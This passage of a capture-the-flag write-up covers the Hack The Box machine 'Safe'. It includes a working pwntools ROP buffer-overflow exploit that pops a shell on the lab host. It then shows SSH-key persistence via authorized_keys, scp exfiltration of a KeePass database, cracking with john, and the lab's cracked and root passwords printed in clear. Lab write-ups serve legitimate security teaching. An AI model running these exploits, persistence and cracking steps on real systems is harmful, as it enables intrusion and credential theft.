class="string">"paaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaava[...]"</span>    ← $rsp</span><br><span class="line"><span class="number">0x00007fffffffe220</span>│+<span class="number">0x0008</span>: <span class="string">"qaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawa[...]"</span></span><br><span class="line"><span class="number">0x00007fffffffe228</span>│+<span class="number">0x0010</span>: <span class="string">"raaaaaaasaaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxa[...]"</span></span><br><span class="line"><span class="number">0x00007fffffffe230</span>│+<span class="number">0x0018</span>: <span class="string">"saaaaaaataaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaaya[...]"</span></span><br><span class="line"><span class="number">0x00007fffffffe238</span>│+<span class="number">0x0020</span>: <span class="string">"taaaaaaauaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaaza[...]"</span></span><br><span class="line"><span class="number">0x00007fffffffe240</span>│+<span class="number">0x0028</span>: <span class="string">"uaaaaaaavaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabba[...]"</span></span><br><span class="line"><span class="number">0x00007fffffffe248</span>│+<span class="number">0x0030</span>: <span class="string">"vaaaaaaawaaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabca[...]"</span></span><br><span class="line"><span class="number">0x00007fffffffe250</span>│+<span class="number">0x0038</span>: <span class="string">"waaaaaaaxaaaaaaayaaaaaaazaaaaaabbaaaaaabcaaaaaabda[...]"</span></span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:<span class="number">64</span> ────</span><br><span class="line">     <span class="number">0x4011a1</span> &lt;main+<span class="number">66</span>&gt;        call   <span class="number">0x401030</span> &lt;<span class="built_in">puts</span>@plt&gt;</span><br><span class="line">     <span class="number">0x4011a6</span> &lt;main+<span class="number">71</span>&gt;        mov    eax, <span class="number">0x0</span></span><br><span class="line">     <span class="number">0x4011ab</span> &lt;main+<span class="number">76</span>&gt;        leave  </span><br><span class="line"> →   <span class="number">0x4011ac</span> &lt;main+<span class="number">77</span>&gt;        ret    </span><br><span class="line">[!] Cannot disassemble from $PC</span><br><span class="line">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────</span><br><span class="line">[#<span class="number">0</span>] Id <span class="number">1</span>, Name: <span class="string">"myapp"</span>, stopped, reason: SIGSEGV</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────</span><br><span class="line">[#<span class="number">0</span>] <span class="number">0x4011ac</span> → main()</span><br><span class="line">───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line">gef➤  pattern offset paaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaava</span><br><span class="line">[+] Searching 'paaaaaaaqaaaaaaaraaaaaaasaaaaaaataaaaaaauaaaaaaava'</span><br><span class="line">[+] Found at offset <span class="number">120</span> (big-endian search)</span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure>
<p>Offset is 120 bytes which means that after 120 bytes we can overwrite <code>rip</code>. </p>
<h3 id="Exploitation-ROP-Chain"><a href="#Exploitation-ROP-Chain" class="headerlink" title="Exploitation: ROP Chain"></a>Exploitation: ROP Chain</h3><p>By checking the functions we will notice a function called <code>test</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">gef➤  info functions</span><br><span class="line">All defined functions:</span><br><span class="line"></span><br><span class="line">Non-debugging symbols:</span><br><span class="line"><span class="number">0x0000000000401000</span>  _init</span><br><span class="line"><span class="number">0x0000000000401030</span>  <span class="built_in">puts</span>@plt</span><br><span class="line"><span class="number">0x0000000000401040</span>  system@plt</span><br><span class="line"><span class="number">0x0000000000401050</span>  <span class="built_in">printf</span>@plt</span><br><span class="line"><span class="number">0x0000000000401060</span>  gets@plt</span><br><span class="line"><span class="number">0x0000000000401070</span>  _start</span><br><span class="line"><span class="number">0x00000000004010a0</span>  _dl_relocate_static_pie</span><br><span class="line"><span class="number">0x00000000004010b0</span>  deregister_tm_clones</span><br><span class="line"><span class="number">0x00000000004010e0</span>  register_tm_clones</span><br><span class="line"><span class="number">0x0000000000401120</span>  __do_global_dtors_aux</span><br><span class="line"><span class="number">0x0000000000401150</span>  frame_dummy</span><br><span class="line"><span class="number">0x0000000000401152</span>  test</span><br><span class="line"><span class="number">0x000000000040115f</span>  main</span><br><span class="line"><span class="number">0x00000000004011b0</span>  __libc_csu_init</span><br><span class="line"><span class="number">0x0000000000401210</span>  __libc_csu_fini</span><br><span class="line"><span class="number">0x0000000000401214</span>  _fini</span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure>
<p>From the disassembly we can easily figure out what <code>test()</code> is doing:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">gef➤  disass test</span><br><span class="line">Dump of assembler code <span class="keyword">for</span> function test:</span><br><span class="line">   <span class="number">0x0000000000401152</span> &lt;+<span class="number">0</span>&gt;:     push   rbp</span><br><span class="line">   <span class="number">0x0000000000401153</span> &lt;+<span class="number">1</span>&gt;:     mov    rbp,rsp</span><br><span class="line">   <span class="number">0x0000000000401156</span> &lt;+<span class="number">4</span>&gt;:     mov    rdi,rsp</span><br><span class="line">   <span class="number">0x0000000000401159</span> &lt;+<span class="number">7</span>&gt;:     jmp    r13</span><br><span class="line">   <span class="number">0x000000000040115c</span> &lt;+<span class="number">10</span>&gt;:    nop</span><br><span class="line">   <span class="number">0x000000000040115d</span> &lt;+<span class="number">11</span>&gt;:    pop    rbp</span><br><span class="line">   <span class="number">0x000000000040115e</span> &lt;+<span class="number">12</span>&gt;:    ret</span><br><span class="line">End of assembler dump.</span><br><span class="line">gef➤</span><br></pre></td></tr></table></figure>
<p>Simply what will happen when we call this function is that whatever is present in <code>rbp</code> will end up in <code>rdi</code>:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">push   rbp</span><br><span class="line">mov    rbp,rsp</span><br><span class="line">mov    rdi,rsp</span><br></pre></td></tr></table></figure>
<p>Then there’s a jump instruction that jumps to the address that the register <code>r13</code> holds:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">jmp    r13</span><br></pre></td></tr></table></figure>
<p>To be benefit from this function we need to be able to control <code>r13</code> and <code>rbp</code>, by controlling <code>r13</code> we can make the program jump to any function of our choice (in this case we need <code>system()</code>), and by controlling <code>rbp</code> we control the parameter (in this case <code>/bin/sh</code>) that will be passed to that function (because it will end up in <code>rdi</code> and the function will take its parameter from <code>rdi</code>)<br><code>rbp</code>:<br>We found the offset which was 120 bytes, after that we can overwrite <code>rip</code>, but 8 bytes before that we can overwrite <code>rbp</code>,<br><code>r13</code>:<br>By looking at the <code>rop</code> gadgets we’ll see a gadget that pops <code>r13</code>, <code>r14</code>, <code>r15</code> then returns:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/safe<span class="meta"># ropper --file myapp</span></span><br><span class="line">---</span><br><span class="line"><span class="number">0x0000000000401206</span>: pop r13; pop r14; pop r15; ret;</span><br><span class="line">---</span><br></pre></td></tr></table></figure>
<p>We can use that gadget to put the address of <code>system()</code> in <code>r13</code> then we can put anything in <code>r14</code> and <code>r15</code><br>Now we have all the pieces, let’s write the exploit.<br>First thing is to load the binary in the script and load the <code>rop</code> gadgets:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">elf = ELF(<span class="string">"./myapp"</span>)</span><br><span class="line">rop = ROP(elf)</span><br></pre></td></tr></table></figure>
<p>We need the addresses for <code>pop r13, r14, r15, ret</code> gadget, <code>test()</code> and <code>system()</code> so let’s get them:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">POP_R13_R14_R15 = (rop.find_gadget([<span class="string">'pop r13'</span>, <span class="string">'pop r14'</span>, <span class="string">'pop r15'</span>, <span class="string">'ret'</span>]))[<span class="number">0</span>]</span><br><span class="line">TEST = elf.symbols[<span class="string">'test'</span>]</span><br><span class="line">SYSTEM = elf.plt[<span class="string">'system'</span>]</span><br></pre></td></tr></table></figure>
<p>Then we can construct the payload which will be: 112 A’s to reach <code>rbp</code> + <code>/bin/bash\x00</code> (will be put in <code>rbp</code>) + <code>pop r13, r14, r15, ret</code> + <code>system()</code> (will be put in <code>r13</code>) + 16 A’s (to fill <code>r14</code> and <code>r15</code>) + <code>test()</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">"A"</span> * <span class="number">112</span></span><br><span class="line">payload += <span class="string">"/bin/sh\x00"</span></span><br><span class="line">payload += p64(POP_R13_R14_R15)</span><br><span class="line">payload += p64(SYSTEM)</span><br><span class="line">payload += <span class="string">"A"</span> * <span class="number">16</span></span><br><span class="line">payload += p64(TEST)</span><br></pre></td></tr></table></figure>
<p>Finally we can connect and send the payload:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">p = remote(<span class="string">"safe.htb"</span>,<span class="number">1337</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">"\n"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p><code>exploit.py</code>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">"./myapp"</span>)</span><br><span class="line">rop = ROP(elf)</span><br><span class="line"></span><br><span class="line">POP_R13_R14_R15 = (rop.find_gadget([<span class="string">'pop r13'</span>, <span class="string">'pop r14'</span>, <span class="string">'pop r15'</span>, <span class="string">'ret'</span>]))[<span class="number">0</span>]</span><br><span class="line">TEST = elf.symbols[<span class="string">'test'</span>]</span><br><span class="line">SYSTEM = elf.plt[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">payload = <span class="string">""</span></span><br><span class="line">payload += <span class="string">"A"</span> * <span class="number">112</span></span><br><span class="line">payload += <span class="string">"/bin/sh\x00"</span></span><br><span class="line">payload += p64(POP_R13_R14_R15)</span><br><span class="line">payload += p64(SYSTEM)</span><br><span class="line">payload += <span class="string">"A"</span> * <span class="number">16</span></span><br><span class="line">payload += p64(TEST)</span><br><span class="line"></span><br><span class="line">log.info(<span class="string">"pop r13, r14, r15 gadget: "</span> + hex(POP_R13_R14_R15))</span><br><span class="line">log.info(<span class="string">"test: "</span> + hex(TEST))</span><br><span class="line">log.info(<span class="string">"system: "</span> + hex(SYSTEM))</span><br><span class="line"></span><br><span class="line">p = remote(<span class="string">"safe.htb"</span>,<span class="number">1337</span>)</span><br><span class="line">p.sendline(payload)</span><br><span class="line">p.sendline(<span class="string">"\n"</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/Desktop/HTB/boxes/safe# ./exploit.py </span><br><span class="line">[*] '/root/Desktop/HTB/boxes/safe/myapp'</span><br><span class="line">    Arch:     amd64<span class="number">-64</span>-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX enabled</span><br><span class="line">    PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x400000</span>)</span></span></span><br><span class="line">[*] Loaded cached gadgets for './myapp'</span><br><span class="line">[*] pop r13, r14, r15 gadget: <span class="number">0x401206</span></span><br><span class="line">[*] test: <span class="number">0x401152</span></span><br><span class="line">[*] system: <span class="number">0x401040</span></span><br><span class="line">[+] Opening connection to safe.htb on port <span class="number">1337</span>: Done</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line"> <span class="number">10</span>:<span class="number">34</span>:<span class="number">34</span> up  <span class="number">2</span>:<span class="number">49</span>,  <span class="number">0</span> users,  load average: <span class="number">0.21</span>, <span class="number">0.21</span>, <span class="number">0.10</span></span><br><span class="line">$ whoami</span><br><span class="line">user</span><br><span class="line">$ pwd</span><br><span class="line">/</span><br><span class="line">$ ls -la /<span class="built_in">home</span></span><br><span class="line">total <span class="number">12</span></span><br><span class="line">drwxr-xr-x  <span class="number">3</span> root root <span class="number">4096</span> May <span class="number">13</span> <span class="number">08</span>:<span class="number">34</span> .</span><br><span class="line">drwxr-xr-x <span class="number">22</span> root root <span class="number">4096</span> May <span class="number">13</span> <span class="number">08</span>:<span class="number">32</span> ..</span><br><span class="line">drwxr-xr-x  <span class="number">3</span> user user <span class="number">4096</span> May <span class="number">13</span> <span class="number">11</span>:<span class="number">18</span> user</span><br></pre></td></tr></table></figure>

<p><img src="/images/hackthebox/safe/3.png" alt=""><br>We owned user.</p>
<h2 id="Cracking-the-KeePass-Database-–-gt-Root-Shell"><a href="#Cracking-the-KeePass-Database-–-gt-Root-Shell" class="headerlink" title="Cracking the KeePass Database –&gt; Root Shell"></a>Cracking the KeePass Database –&gt; Root Shell</h2><p>After getting a shell we can <code>echo</code> our public key to <code>/home/user/.ssh/authorized_keys</code> and get <code>ssh</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$ cd &#x2F;home&#x2F;user</span><br><span class="line">$ echo &quot;ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDGEUzu7cGthWtPNXM5&#x2F;rAvPBywgyh68AEpSyUBXm24kByXu+GhEmvAiVlkAhasBgTjiCbpup3dmzz54ADlo4T2jUWoVVEDOw82eKQ6EoqpYnHGVmpDmJ1n7+eCvb3ut0bl5VOnTkhYSWS8G9V6V+E&#x2F;VmDun63HoHCHzvtBlbN&#x2F;ZmhRKxdwNFSYN&#x2F;NswU8MFK+MVXxa&#x2F;FJUxrOJVAnefXQdfDBxIt4j&#x2F;qqMr68u9lQfqOX5shmS0M55lFNAY2mR6INBQtT6AnAWremPCHdUHxU3eSvzUcItaamecSPTfDgMQDQkxXrrsKQLkJeCKZ&#x2F;1EwDBXIF3RGCeNGq0hCYHSF8d root@kali&quot; &gt; .ssh&#x2F;authorized_keys$</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;safe# ssh -i id_rsa user@safe.htb</span><br><span class="line">Linux safe 4.9.0-9-amd64 #1 SMP Debian 4.9.168-1 (2019-04-12) x86_64</span><br><span class="line"></span><br><span class="line">The programs included with the Debian GNU&#x2F;Linux system are free software;</span><br><span class="line">the exact distribution terms for each program are described in the</span><br><span class="line">individual files in &#x2F;usr&#x2F;share&#x2F;doc&#x2F;*&#x2F;copyright.</span><br><span class="line"></span><br><span class="line">Debian GNU&#x2F;Linux comes with ABSOLUTELY NO WARRANTY, to the extent</span><br><span class="line">permitted by applicable law.</span><br><span class="line">user@safe:~$</span><br></pre></td></tr></table></figure>
<p>In the home directory of the user there was a <code>keepass</code> database and 6 images, one of them is the key:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">user@safe:~$ ls -la</span><br><span class="line">total 11284</span><br><span class="line">drwxr-xr-x 3 user user    4096 May 13 11:18 .</span><br><span class="line">drwxr-xr-x 3 root root    4096 May 13 08:34 ..</span><br><span class="line">lrwxrwxrwx 1 user user       9 May 13 08:38 .bash_history -&gt; &#x2F;dev&#x2F;null</span><br><span class="line">-rw-r--r-- 1 user user     220 May 13 08:34 .bash_logout</span><br><span class="line">-rw-r--r-- 1 user user    3526 May 13 08:34 .bashrc</span><br><span class="line">-rw-r--r-- 1 user user 1907614 May 13 11:15 IMG_0545.JPG</span><br><span class="line">-rw-r--r-- 1 user user 1916770 May 13 11:15 IMG_0546.JPG</span><br><span class="line">-rw-r--r-- 1 user user 2529361 May 13 11:15 IMG_0547.JPG</span><br><span class="line">-rw-r--r-- 1 user user 2926644 May 13 11:15 IMG_0548.JPG</span><br><span class="line">-rw-r--r-- 1 user user 1125421 May 13 11:15 IMG_0552.JPG</span><br><span class="line">-rw-r--r-- 1 user user 1085878 May 13 11:15 IMG_0553.JPG</span><br><span class="line">-rwxr-xr-x 1 user user   16592 May 13 08:47 myapp</span><br><span class="line">-rw-r--r-- 1 user user    2446 May 13 11:15 MyPasswords.kdbx</span><br><span class="line">-rw-r--r-- 1 user user     675 May 13 08:34 .profile</span><br><span class="line">drwx------ 2 user user    4096 Oct 25 10:37 .ssh</span><br><span class="line">-rw------- 1 user user      33 May 13 09:25 user.txt</span><br><span class="line">user@safe:~$</span><br></pre></td></tr></table></figure>
<p>I downloaded the database and the images using <code>scp</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;safe# scp -i .&#x2F;id_rsa user@safe.htb:&#x2F;home&#x2F;user&#x2F;MyPasswords.kdbx .&#x2F;</span><br><span class="line">MyPasswords.kdbx                                                                                                                                                                 100% 2446    14.8KB&#x2F;s   00:00    </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;safe# scp -i .&#x2F;id_rsa user@safe.htb:&#x2F;home&#x2F;user&#x2F;IMG_0545.JPG .&#x2F;</span><br><span class="line">IMG_0545.JPG                                                                                                                                                                     100% 1863KB 112.2KB&#x2F;s   00:16    </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;safe# scp -i .&#x2F;id_rsa user@safe.htb:&#x2F;home&#x2F;user&#x2F;IMG_0546.JPG .&#x2F;</span><br><span class="line">IMG_0546.JPG                                                                                                                                                                     100% 1872KB 149.8KB&#x2F;s   00:12    </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;safe# scp -i .&#x2F;id_rsa user@safe.htb:&#x2F;home&#x2F;user&#x2F;IMG_0547.JPG .&#x2F;</span><br><span class="line">IMG_0547.JPG                                                                                                                                                                     100% 2470KB  98.6KB&#x2F;s   00:25    </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;safe# scp -i .&#x2F;id_rsa user@safe.htb:&#x2F;home&#x2F;user&#x2F;IMG_0548.JPG .&#x2F;</span><br><span class="line">IMG_0548.JPG                                                                                                                                                                     100% 2858KB 167.4KB&#x2F;s   00:17    </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;safe# scp -i .&#x2F;id_rsa user@safe.htb:&#x2F;home&#x2F;user&#x2F;IMG_0552.JPG .&#x2F;</span><br><span class="line">IMG_0552.JPG                                                                                                                                                                     100% 1099KB 210.1KB&#x2F;s   00:05    </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;safe# scp -i .&#x2F;id_rsa user@safe.htb:&#x2F;home&#x2F;user&#x2F;IMG_0553.JPG .&#x2F;</span><br><span class="line">IMG_0553.JPG                                                                                                                                                                     100% 1060KB 161.0KB&#x2F;s   00:06    </span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;safe#</span><br></pre></td></tr></table></figure>
<p>Similar to what we did in <a href="/hack-the-box/bighead/">BigHead</a> we’ll use an image as a key and use <code>keepass2john</code> then crack the database. The only difference is that we’ll need to try 6 images to find the right one.<br>After some attempts, the right image was <code>IMG_0547.JPG</code> and instead of using full <code>rockyou.txt</code> I used <a href="https://github.com/danielmiessler/SecLists/blob/master/Passwords/Leaked-Databases/rockyou-70.txt" target="_blank" rel="noopener"><code>rockyou-70.txt</code></a> and it had the password (<code>bullshit</code>):</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;safe# keepass2john -k IMG_0547.JPG .&#x2F;MyPasswords.kdbx &gt; hash.txt</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;safe# john --wordlist&#x3D;.&#x2F;rockyou-70.txt .&#x2F;hash.txt</span><br><span class="line">Using default input encoding: UTF-8</span><br><span class="line">Loaded 1 password hash (KeePass [SHA256 AES 32&#x2F;64 OpenSSL])</span><br><span class="line">Cost 1 (iteration count) is 60000 for all loaded hashes</span><br><span class="line">Cost 2 (version) is 2 for all loaded hashes</span><br><span class="line">Cost 3 (algorithm [0&#x3D;AES, 1&#x3D;TwoFish, 2&#x3D;ChaCha]) is 0 for all loaded hashes</span><br><span class="line">Press &#39;q&#39; or Ctrl-C to abort, almost any other key for status</span><br><span class="line">bullshit         (MyPasswords)</span><br><span class="line">1g 0:00:00:18 DONE (2019-10-25 16:44) 0.05440g&#x2F;s 54.84p&#x2F;s 54.84c&#x2F;s 54.84C&#x2F;s bullshit</span><br><span class="line">Use the &quot;--show&quot; option to display all of the cracked passwords reliably</span><br><span class="line">Session completed</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;safe#</span><br></pre></td></tr></table></figure>
<p>Let’s open the database:<br><img src="/images/hackthebox/safe/4.png" alt=""></p>
<p><img src="/images/hackthebox/safe/5.png" alt=""></p>
<p><img src="/images/hackthebox/safe/6.png" alt=""><br>Root’s password was there so I copied it then I used it to <code>su</code>:</p>
<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;safe# nano root_password.txt</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;safe# cat root_password.txt </span><br><span class="line">u3v2249dl9ptv465cogl3cnpo3fyhk</span><br><span class="line">root@kali:~&#x2F;Desktop&#x2F;HTB&#x2F;boxes&#x2F;safe#</span><br></pre></td></tr></table></figure>

<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">user@safe:~$ su</span><br><span class="line">Password: </span><br><span class="line">root@safe:&#x2F;home&#x2F;user# whoami</span><br><span class="line">root</span><br><span class="line">root@safe:&#x2F;home&#x2F;user# id</span><br><span class="line">uid&#x3D;0(root) gid&#x3D;0(root) groups&#x3D;0(root)</span><br><span class="line">root@safe:&#x2F;home&#x2F;user#</span><br></pre></td></tr></table></figure>

<p><img src="/images/hackthebox/safe/7.png" alt=""><br>And we owned root !<br>That’s it , Feedback is appreciated !<br>Don’t forget to read the <a href="/categories">previous write-ups</a> , Tweet about the write-up if you liked it , follow on twitter <a href="https://twitter.com/Ahm3d_H3sham" target="_blank" rel="noopener">@Ahm3d_H3sham</a><br>Thanks for reading.</p>
<p>Previous Hack The Box write-up : <a href="/hack-the-box/ellingson/">Hack The Box - Ellingson</a><br>Next Hack The Box write-up : <a href="/hack-the-box/haystack/">Hack The Box - Haystack</a></p>

</div>


  <div class="book-comments">
    




  </div>



<script src="/js/book-post.js"></script>

        </div>
      </div>
      <div class="column col-2 hide-lg">
        <div class="book-post-info">
  
    <div class="book-post-meta">

  <div class="author">

    <!-- Author image -->
    <div class="author-img">
      
        <figure class="avatar avatar-lg">
          <img src="/avatar.jpg" alt="...">
        </figure>
      
    </div>

    <!-- Author title -->
    <div class="author-title">
      <div>0xRick</div>
      <div>2019-10-26</div>
    </div>
  </div>

  
    <div class="divider"></div>

    <div class="link">
      <a class="category-link" href="/categories/hack-the-box/">hack-the-box</a>

      <a class="tag-link" href="/tags/binary-exploitation/" rel="tag">#binary-exploitation</a> <a class="tag-link" href="/tags/buffer-overflow/" rel="tag">#buffer-overflow</a> <a class="tag-link" href="/tags/exploit-development/" rel="tag">#exploit-development</a> <a class="tag-link" href="/tags/linux/" rel="tag">#linux</a> <a class="tag-link" href="/tags/python/" rel="tag">#python</a> <a class="tag-link" href="/tags/ssh/" rel="tag">#ssh</a>
    </div>
    
  

  <div class="divider"></div>
</div>
  

  <div class="book-tocbot">
</div>
<div class="book-tocbot-menu">
  <a class="book-toc-expand" onclick="expand_toc()">Expand all</a>
  <a onclick="go_top()">Back to top</a>
  <a onclick="go_bottom()">Go to bottom</a>
</div>


<script src="/js/book-toc.js"></script>

</div>
      </div>
    </div>
  </div>
  
  <a class="off-canvas-overlay" onclick="hide_canvas()"></a>
</div>

</body>
</html>


<script src="/js/book.js"></script>
